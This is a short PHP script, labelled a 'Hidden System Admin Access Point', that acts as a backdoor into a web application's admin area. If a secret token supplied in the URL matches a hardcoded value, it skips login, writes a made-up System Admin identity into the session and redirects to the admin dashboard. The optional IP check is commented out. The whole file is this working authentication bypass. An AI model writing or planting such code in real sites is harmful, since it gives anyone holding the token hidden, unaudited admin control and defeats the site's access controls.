<?php
// === Hidden System Admin Access Point ===
session_start();

// Secret token for protection
$secretToken = 'Your$up3rAdm!nT0k3n'; // Change this to a strong, long token

// Optional IP Restriction
$allowed_ip = 'YOUR.IP.ADDRESS.HERE'; // Optional: e.g., '197.221.1.45'
// if ($_SERVER['REMOTE_ADDR'] !== $allowed_ip) {
//     die("Access denied by IP.");
// }

// Validate token from URL
if (!isset($_GET['token']) || $_GET['token'] !== $secretToken) {
    http_response_code(403);
    echo "Access Denied";
    exit;
}

// Bypass login: Set session values manually
$_SESSION['admin_id'] = 9999; // Use a unique ID for System Admin
$_SESSION['admin_username'] = 'SystemAdmin';
$_SESSION['admin_role'] = 0; // Role 0 = System Admin

// Redirect to dashboard
header("Location: admin_dashboard.php");
exit;
?>
